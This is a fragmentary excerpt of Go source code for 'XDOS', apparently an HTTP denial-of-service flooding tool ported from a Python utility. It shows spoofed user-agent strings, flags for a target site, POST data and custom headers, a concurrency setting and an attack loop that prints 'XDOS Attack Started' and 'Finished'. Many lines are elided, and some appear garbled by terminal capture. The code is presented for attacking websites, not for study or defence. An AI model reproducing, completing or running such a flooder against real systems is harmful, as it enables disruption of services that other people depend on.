...
/*
 XDOS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
 Original Python utility by itsR03D17w7

 This go program licensed under GPLv3.
 Copyright itsR03D17w7 I.Choukombi <choukombi@gmail.com>
*/
...
var (
        ...
        headersUseragents []string = []string{
                ...
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.307                                    $
...
func main() {
        ...
        flag.StringVar(&site, "site", "http://localhost", "Destination site.")                                                                                                              flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
        flag.StringVar(&data, "data", "", "Data to POST. If present xdos will use POST requests instead of GET")
        flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
        flag.Parse()

        t := os.Getenv("XDOSMAXPROCS")
        ...
        go func() {
                fmt.Println("-- XDOS Attack Started --\n           Go!\n\n")
                ...
                for {
                        ...
                        case targetComplete:
                                sent++
                                fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
                                fmt.Println("\r-- XDOS Attack Finished --       \n\n\r")
                                os.Exit(0)
                        }
                }
        }()
